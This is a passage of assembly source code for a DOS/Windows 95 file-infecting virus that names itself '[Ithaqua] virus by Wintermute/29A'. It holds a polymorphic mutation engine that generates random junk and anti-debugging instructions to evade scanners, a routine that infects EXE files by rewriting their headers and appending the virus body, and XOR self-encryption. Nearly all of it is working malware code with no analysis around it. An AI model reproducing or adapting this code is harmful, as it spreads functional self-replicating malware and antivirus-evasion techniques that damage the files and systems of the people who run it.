           push    cx dx ax      ;by the minutes ( but in Al, the less
           mov     ah,2ch        ;used, to contribute to the slow poly )
           int     21h           ;and hour.
           pop     ax
           add     ah,ch
           pop     dx cx
           rol     ax,1
           neg     ax
           sub     ax,2311h
           ror     ax,3
           not     ax
           mov     word ptr[num_aleat],ax
           ret

     ; Instructions generators: the required instructions are generated and
     ;copied in es:di, which points to the decryptor in memory

     ; Main generator: Copies a decryptor instruction in es:di, with special
     ;care for the final loop

   gen_instruction:
           mov     al,byte ptr [numero_instruccion]
           and     al,al
           jz      @vasmosnos
           dec     al
           jz      @preparar_loop
           dec     al
           jz      @guardar_paraloop
   @gen_ya:
           dec     byte ptr [numero_instruccion]
           lea     si,instrucciones
           add     si,word ptr [bytes_referencia]
           add     word ptr [bytes_referencia],5h

           mov     cx,5            ; copy the instruction
           rep     movsb
           sub     word ptr[restantes_poly],5h  ; remaining instrs


   @vasmosnos:
           ret
   @guardar_paraloop:
           mov     word ptr [loop_site],di
           jmp     @gen_ya

   @preparar_loop:
           mov     ax,0fdh     ; fc
           mov     si,di
           mov     cx,word ptr cs:[loop_site]
           sub     si,cx
           sub     ax,si
           mov     cx,word ptr [num_aleat]
           and     cl,1
           jz      @make_a_jnz
           mov     byte ptr [instrucciones+11h],al
           jmp     @gen_ya
   @make_a_jnz:
           mov     word ptr [instrucciones+10h],7549h
           dec     ax
           mov     byte ptr [instrucciones+12h],al
           push    di
           lea     di, instrucciones+13h
           call    inst_1
           pop     di
           jmp     @gen_ya

     ; Generator ----> One byte length instructions generator

   inst_1:
           call    aleatorio
           and     al,3h
           jnz     @cont_a1
           mov     byte ptr es:[di],90h
           ret
   @cont_a1:
           and     ah,1
           jz      @cont_a2
           call    aleatorio
           and     ah,1h
           jz      @cont_a2_2
           and     al,1h
           jz      @cont_a2_1_1
           call    aleatorio
           and     al,1h
           jz      @cont_a2_2_1
           mov     byte ptr es:[di],42h     ; inc dx
           ret
   @cont_a2_2_1:
           mov     byte ptr es:[di],43h     ; inc bx
           ret
   @cont_a2_1_1:
           mov     byte ptr es:[di],40h     ; inc ax
           ret
   @cont_a2_2:
           call    aleatorio
           and     al,1h
           jnz     @cont_a2_2_2
           mov     byte ptr es:[di],48h     ; dec ax
           ret
   @cont_a2_2_2:
           and     ah,1h
           jz      @cont_a2_2_2_2
           mov     byte ptr es:[di],4bh     ; dec bx
           ret
   @cont_a2_2_2_2:
           and     al,1h
           mov     byte ptr es:[di],4ah     ; dec dx
           ret
   @cont_a2:
           call    aleatorio
           and     al,3h
           jz      @cont_a2_11
           and     ah,3h
           jz      @cont_a2_12
           call    aleatorio
           and     al,3h
           jz      @cont_a2_2_11
           and     ah,3h
           jz      @cont_a2_2_12
           call    aleatorio
           and     al,1
           jz      @cont_a2_2_13
           mov     byte ptr es:[di],0cch    ; int 3h
           ret
   @cont_a2_2_11:
           mov     byte ptr es:[di],9fh     ; lahf
           ret
   @cont_a2_2_12:
           mov     byte ptr es:[di],99h     ; cwd
           ret
   @cont_a2_2_13:
           mov     byte ptr es:[di],98h     ; cbw
           ret
   @cont_a2_11:
           mov     byte ptr es:[di],0F9h    ; stc
           ret
   @cont_a2_12:
           mov     byte ptr es:[di],0F8h    ; clc
           ret



     ; Generator ----> Two bytes length instructions

   inst_2:
           call    aleatorio
           and     ah,1h
           jz      @cont_sub
           cbw
           and     ah,1h
           jz      sigunvm
           jmp     @cont_xor
   sigunvm:
           jmp     @cont_mul
   @cont_sub:
           mov     byte ptr es:[di],2bh
           inc     di
           cbw
           and     al,1
           jz      @cont_bsub_ax
           and     ah,1
           jz      @cont_bsub_dx
           call    aleatorio
           and     ah,1
           jz      @cont_bsub_bx_dxdisi
           and     al,1
           jz      @cont_bsub_bx_cx
           mov     byte ptr es:[di],0d8h  ; sub bx,ax
           ret
   @cont_bsub_bx_cx:
           mov     byte ptr es:[di],0d9h  ; sub bx,cx
           ret
   @cont_bsub_bx_dxdisi:
           cbw
           and     ah,1
           jz      @cont_bsub_bx_dx
           and     al,1
           jz      @cont_bsub_bx_di
           mov     byte ptr es:[di],0deh   ; sub bx,si
           ret
   @cont_bsub_bx_di:
           mov     byte ptr es:[di],0dfh   ; sub bx,di
           ret
   @cont_bsub_bx_dx:
           mov     byte ptr es:[di],0dah  ; sub bx,dx
           ret
   @cont_bsub_ax:
           call    aleatorio
           and     ah,1
           jz      @cont_bsub_ax_dxdisi
           and     al,1
           jz      @cont_bsub_ax_cx
           mov     byte ptr es:[di],0c3h  ; sub ax,bx
           ret
   @cont_bsub_ax_cx:
           mov     byte ptr es:[di],0c1h  ; sub ax,cx
           ret
   @cont_bsub_ax_dxdisi:
           cbw
           and     ah,1
           jz      @cont_bsub_ax_dx
           and     al,1
           jz      @cont_bsub_ax_di
           mov     byte ptr es:[di],0c6h  ; sub ax,si
           ret
   @cont_bsub_ax_di:
           mov     byte ptr es:[di],0c7h  ; sub ax,di
           ret
   @cont_bsub_ax_dx:
           mov     byte ptr es:[di],0c2h  ; sub ax,dx
           ret
   @cont_bsub_dx:
           call    aleatorio
           and     ah,1
           jz      @cont_bsub_dx_sidicx
           and     al,1
           jz      @cont_bsub_dx_bx
           mov     byte ptr es:[di],0d0h     ; sub dx,ax
           ret
   @cont_bsub_dx_bx:
           mov     byte ptr es:[di],0d3h     ; sub dx,bx
           ret
   @cont_bsub_dx_sidicx:
           cbw
           and     ah,1
           jz      @cont_bsub_dx_cx
           and     al,1
           jz      @cont_bsub_dx_di
           mov     byte ptr es:[di],0d6h     ; sub dx,si
           ret
   @cont_bsub_dx_di:
           mov     byte ptr es:[di],0d7h     ; sub dx,di
           ret
   @cont_bsub_dx_cx:
           mov     byte ptr es:[di],0d1h     ; sub dx,cx
           ret

   @cont_xor:
           mov     byte ptr es:[di],033h
           inc     di
           call    aleatorio
           and     ah,1
           jz      @cont_xor_4last
           cbw
           and     ah,1
           jz      @cont_xor_34
           and     al,1
           jz      @cont_xor_2
           mov     byte ptr es:[di],0c0h     ; xor ax,ax
           ret
   @cont_xor_2:
           mov     byte ptr es:[di],0c3h     ; xor ax,bx
           ret
   @cont_xor_34:
           and     al,1
           jz      @cont_xor_4
           mov     byte ptr es:[di],0c2h     ; xor ax,dx
           ret
   @cont_xor_4:
           mov     byte ptr es:[di],0dbh     ; xor bx,bx
           ret
   @cont_xor_4last:
           cbw
           and     ah,1
           jz      @cont_xor_78
           and     al,1
           jz      @cont_xor_6
           mov     byte ptr es:[di],0d8h     ; xor bx,ax
           ret
   @cont_xor_6:
           mov     byte ptr es:[di],0dah     ; xor bx,dx
           ret
   @cont_xor_78:
           and     al,1
           jz      @cont_xor_8
           mov     byte ptr es:[di],0d2h     ; xor dx,dx
           ret
   @cont_xor_8:
           mov     byte ptr es:[di],0d0h     ; xor dx,ax
           ret

   @cont_mul:
           mov     byte ptr es:[di],0f7h
           inc     di
           call    aleatorio

           and     ah,1
           jz      @cont_divmul_34
           and     al,1
           jz      @cont_divmul_2
           mov     byte ptr es:[di],0e3h       ; mul bx
           ret
   @cont_divmul_2:
           mov     byte ptr es:[di],0e1h       ; mul cx
           ret
   @cont_divmul_34:
           and     al,1
           jz      @cont_divmul_4
           mov     byte ptr es:[di],0e6h       ; mul si
           ret
   @cont_divmul_4:
           mov     byte ptr es:[di],0e7h       ; mul di
           ret


     ; Generator ----> Three bytes long instructions

   inst_3:
           call    aleatorio
           mov     si,ax
           inc     si              ; We don't want a 0ffffh
           jz      inst_3
           dec     si
           and     ah,1
           jz      @add_or_sub_ax
           and     al,1
           jz      @mov_dx_inm
           mov     byte ptr es:[di],0bbh   ; mov bx,reg
           mov     word ptr es:[di+1],si
           ret
   @mov_dx_inm:
           mov     byte ptr es:[di],0bah   ; mov dx,reg
           mov     word ptr es:[di+1],si
           ret
   @add_or_sub_ax:
           and     al,1
           jz      @mov_mem_ax
           mov     byte ptr es:[di],05h    ; add ax,reg
           mov     word ptr es:[di+1],si
           ret
   @mov_mem_ax:
           mov     byte ptr es:[di],0a1h   ; mov ax,mem
           mov     word ptr es:[di+1],si
           ret


     ; Generator ----> Four bytes instructions

   inst_4:
           call    aleatorio
           mov     si,ax
           inc     si
           jz      inst_4
           dec     si
           and     ah,1
           jz      @q_seg_parte
           cbw
           and     ah,1
           jz      @q_movdxobx
           and     al,1
           jz      @q_subbxfuck
           cmp     byte ptr [numero_instruccion],1 ; I don't want to
           jz      @q_subbxfuck   ; make an Int21h about 7000 times <g>
           call    aleatorio
           and     ax,11b
           add     al,al
           push    si
           lea     si,@IntFunctions
           add     si,ax
           lodsw
           pop     si
           mov     word ptr es:[di],ax      ; Get drive function
           mov     word ptr es:[di+2],021cdh
           ret

   @IntFunctions:
           dw      035b4h,052b4h,019b4h,062b4h

   @q_subbxfuck:
           mov     word ptr es:[di],0eb81h
           mov     word ptr es:[di+2],si
           ret

   @q_movdxobx:
           and     al,1
           jz      @q_movdx_mem
           mov     word ptr es:[di],01e8bh
           mov     word ptr es:[di+2],si
           ret

   @q_movdx_mem:
           mov     word ptr es:[di],0168bh
           mov     word ptr es:[di+2],si
           ret
   @q_seg_parte:
           cbw
           and     ah,1
           jz      @q_seg_sub
           mov     word ptr es:[di],0c281h
           mov     word ptr es:[di+2],si
           and     al,1
           jz      @nosvamos_4
           inc     byte ptr es:[di+1]
   @nosvamos_4:
           ret
   @q_seg_sub:
           mov     word ptr es:[di],0ea81h
           mov     word ptr es:[di+2],si
           and     al,1
           jz      @nosvamos_41
           inc     word ptr es:[di+1]
   @nosvamos_41:
           ret


    ; Generator ----> More than 4 bytes routines

   inst_5:
           call    aleatorio               ; Anti-spectral routine,
           and     ah,1                    ;generates a random value
           jz      @c_seg_parte            ;after a cmp ax,ax/jz xxx
           cbw
           and     al,1                    ;that will never be executed:
           jz      @c_seg_prim             ;'spectral' is a way of
           mov     word ptr es:[di],0c033h ;finding polymorphic viruses
           mov     word ptr es:[di+2],0274h;that checks for instructions
           call    aleatorio               ;that aren't in the poly
           mov     word ptr es:[di+4],ax   ;engine; if the instructions
           mov     si,06h                  ;are all of a fixed range,
           ret                             ;the spectral identifies the
                                                   ;poly engine.

   @c_seg_prim:
           and     ah,1
           jz      @reentrant_calls

   Etiketa:

           mov     word ptr es:[di],0f7fah     ; Antidebugging routine
           mov     word ptr es:[di+2],0f7dch   ;( cli, neg sp, neg sp,
           mov     word ptr es:[di+4],0fbdch   ; sti )
           mov     si,06h
           ret

   @c_seg_parte:
           cbw
           and     al,1
           jz      @c_seg_seg              ; Anti-spectral
           and     ah,1
           jz      @reentrant_calls
           mov     word ptr es:[di],0ffb8h     ; mov ax,0ffffh
           mov     word ptr es:[di+2],040ffh   ; inc ax
           mov     word ptr es:[di+4],0274h   ; jz  seguimos
           call    aleatorio                   ; ( 2 crap bytes )
           mov     word ptr es:[di+6],ax
           mov     si,08h
           ret

   @c_seg_seg:
           and     ah,1
           jz      @make_dumb_jmp
           lea     si,ant_debug            ; Antidebugging, the routine
           mov     cx,@End_ant-ant_debug    ;placed near the beggining
           push    cx                      ;of Zohra
           rep     movsb
           pop     si
           sub     di,si
           ret

   @make_dumb_jmp:
           mov     bl,06h
           call    get_random
           mov     al,0ebh
           mov     ah,bl
           stosw
           xor     cx,cx
           mov     cl,bl
           mov     si,2d
           add     si,cx
   garbage_inside:
           call    aleatorio
           stosb
           loop    garbage_inside
           sub     di,si
           ret

   ant_debug:
           push    ax              ; Anti-debugging typical old boring
           pop     ax              ;routine :-P.
           dec     sp
           dec     sp
           pop     bx
           cmp     ax,bx
           jz      @End_ant
           mov     ax,4c00h
           int     21h
   @End_ant:

   reentrant_flag:
           db      0
   posicion_sub:
           dw      0

   @reentrant_calls:

           dec     byte ptr [reentrant_flag]
           jz      @make_call

           cmp     word ptr [restantes_poly],50d
           jbe     Etiketa

           mov     bl,20d
           call    get_random
           add     bx,5d                   ; At least inside = 5 bytes
           mov     al,0ebh
           mov     ah,bl
           inc     ah
           xor     cx,cx
           mov     cl,bl
           push    di
           stosw                       ; The jump is stored
           mov     word ptr [posicion_sub],di
           push    cx

           push    word ptr [restantes_poly]       ; Make a mini-poly :P
           push    word ptr [Numero_instruccion]
           mov     word ptr [restantes_poly],cx
           mov     word ptr [numero_instruccion],0
           call    centro_poly
           pop     word ptr [Numero_instruccion]
           pop     word ptr [restantes_poly]

           mov     al,0c3h
           stosb
           pop     cx
           add     cx,3
           mov     si,cx
           mov     byte ptr [reentrant_flag],1
           pop     di
           ret

   @make_call:

           push    di
           mov     al,0e8h
           stosb

           mov     ax,word ptr [posicion_sub]  ; Operate call
           sub     ax,di
           dec     ax
           dec     ax
           stosw

           pop     di
           mov     si,03h

           ret


   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;       Windows 95 adapted shit
   ;                           W95 adapted shit
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   EXE_W95_Infect:

           call    front_door

           dec     si
           cmp     word ptr ds:[si-3],'XE'
           jnz     end_infection;@nah_fuck



           xor     bp,bp
                           ; Attributes
           mov     ax,4300h
           div     bp
           mov     ax,4301h
           push    ax cx dx ds
           xor     cx,cx
           div     bp

           mov     ax,3d02h
           div     bp
           jc      restore_attrs
           xchg    ax,bx

           mov     ax,5700h                ; Time/date of file
           push    ax
           div     bp
           push    dx cx
           and     cl,1eh
           xor     cl,1eh
           jz      @itwasinfected

           push    cs
           pop     ds
           mov     ah,3fh                  ; Reads header
           mov     cx,01ch
           lea     dx,buffercom
           div     bp

           mov     ax,word ptr ds:[buffercom]
           add     al,ah
           sub     al,'M'+'Z'
           jnz     @itwasinfected

           cbw                                     ; overlays
           cmp     word ptr ds:[buffercom+1ah],ax
           jnz     @itwasinfected

           cmp     word ptr ds:[buffercom+18h],40h    ; Windoze
           jz      @itwasinfected

           call    Ptrtoend                        ; EOF

           push    ax
           shr     ax,4
           shl     dx,12
           add     dx,ax
           sub     dx,word ptr cs:[buffercom+8]
           pop     si
           and     si,0fh

           push    si
           add     si,100h
           mov     ax,si
           call    Smack_My_Bitch_UP
           mov     bp,1

           mov     word ptr cs:[stack_old],sp  ; not enuff stack sometimes
           mov     word ptr cs:[stack_old+2],ss
           push    cs
           pop     ss
           mov     sp,offset _endstack2-2

           sub     word ptr cs:[return_point],tha_difference
           call    copy_myself
           add     word ptr cs:[return_point],tha_difference

           mov     ss,word ptr cs:[stack_old+2]
           mov     sp,word ptr cs:[stack_old]

           pop     si

           mov     ds:word ptr [CS_IP+2],dx    ; We actualize header
           inc     dx
           mov     ds:word ptr [buffercom+0eh],dx
           mov     ds:word ptr [CS_IP],si
           mov     ds:word ptr [buffercom+10h],((virus_size+300h-15h)/2)*2

           call    Ptrtoend

           mov     cx,200h
           div     cx
           inc     ax
           mov     word ptr cs:[buffercom+2],dx        ; File size, etc
           mov     word ptr cs:[buffercom+4],ax

           mov     ax,4200h
           call    Ptrtowhatever

           push    cs
           pop     ds
           mov     ah,40h      ; Write header
           mov     cx,01ch
           lea     dx,buffercom
           div     bp

   @itwasinfected:
                           ;date
           pop     cx dx ax
           inc     ax
           or      cl,1fh
           div     bp

   restore_attrs:
                           ;attr
           pop     ds dx cx ax
           div     bp

           jmp     @closego

   Ptrtoend:
           mov     ax,4202h

   Ptrtowhatever:
           xor     cx,cx
           cwd
           div     dx
           ret




   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                           Data for the virus
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ret_pos:    dw      100h
   buffercom:  db      0cdh,020h,00h
               db      11h dup (0)
   CS_IP:
               dw      offset temp2,0
               db      01ch-16h dup (0)
   comjmp:     db      0e9h,00h,00h
   are_we_on_MBR:  db  0
   This_Virus_Has_Internal_Text_XP:
               db      'Love. Hate. I''ll be awaiting you on the dark side, '
               db      'watching the nonsense.',0
   VName:
               db      '[Ithaqua] virus by Wintermute/29A',0

   encryption_ends     label   byte

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                          Encryption/decryption
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; Let's hide. Artificial beeing makes hunters ignore.
   ;

   Swap_seg: dw    0
   Swap_off: dw    0

   copy_myself:

           call    push_all_regs

           push    bx
           mov     word ptr cs:[0000h],071eh

           mov     bx,bp
           xor     si,si
           push    si
           push    cs cs
           pop     ds es
           mov     di,virus_size+201h
           mov     dx,di                   ; Start crypt
           mov     bp,dx
           mov     cx,virus_size
           push    cx
           rep     movsb
           call    decrypt

           pop     cx
                                               ; Now we crypt poly engine
           dec     bx                      ; Are we able to make poly ?
           jnz     No_Poly_This_Time       ; Don't poly when inserting
           call    push_all_regs
           call    RNME        ; Reconstructed Necromantic Mutation Engine
           call    pop_all_regs
           add     cx,200h
           sub     dx,200h

   No_Poly_This_Time:

           pop     di bx
           mov     ah,52h
           add     ah,0eeh
           div     di

           call    decrypt

           call    pop_all_regs
           ret


   int0h:      dw      0,0
   int0handler:

           call    call_21h
           mov     word ptr cs:[_bp],bp
           mov     bp,sp
           add     word ptr ss:[bp],2
           mov     bp,word ptr cs:[_bp]
           retf    2

   call_21h:
           pushf
           call    dword ptr cs:[int21h]
           ret


   j21:    db      0eah
   int21h: dw      0,0
   int21h_plural:  dw  0,0,0,0,0,0   ; Four int21h addresses
   outta_crypt:    db  0


   decrypt:
           mov     al,byte ptr cs:[outta_crypt+bp]
           lea     si,encryption_starts
           mov     cx,encryption_length
           add     si,bp
   @crypt_loop:
           xor     byte ptr cs:[si],al
           inc     si
           loop    @crypt_loop

           ret

   virus_ends label byte
   virus_size equ virus_ends-virus_starts
   virus_16b equ ((virus_size+15)/16)+1

   temp:
           sub     word ptr cs:[Fut_Crypt],(temp-decrypt)
           ret

   temp2:
           mov     ax,4c00h
           int     21h


   End Virus

   ; But, in the end, I recover normality. Happier. Thoughtless ?
